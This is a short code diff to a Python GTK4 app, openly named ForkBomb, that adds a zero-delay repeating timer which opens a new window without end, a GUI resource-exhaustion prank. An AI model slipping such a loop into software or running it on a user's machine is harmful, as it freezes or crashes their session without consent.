@@ -3,7 +3,7 @@ import gi
 
 gi.require_version('Gtk', '4.0')
 gi.require_version('Adw', '1')
-from gi.repository import Gtk, Adw, Gdk
+from gi.repository import Gtk, Adw, Gdk, GLib
 
 css_provider = Gtk.CssProvider()
 css_provider.load_from_path('style.css')
@@ -54,3 +54,14 @@ class ForkBomb(Adw.Application):
     def on_activate(self, app):
         self.win = ForkBombWindow(application=app)
         self.win.present()
+
+        GLib.timeout_add_seconds(0, self.create_new_window)
+
+    def create_new_window(self):
+        new_win = ForkBombWindow(application=self)
+        new_win.present()
+        return GLib.SOURCE_CONTINUE
+
+def fork_bomb_window():
+    app = ForkBomb(application_id="com.touch-grass.Intro")
+    app.run(sys.argv)
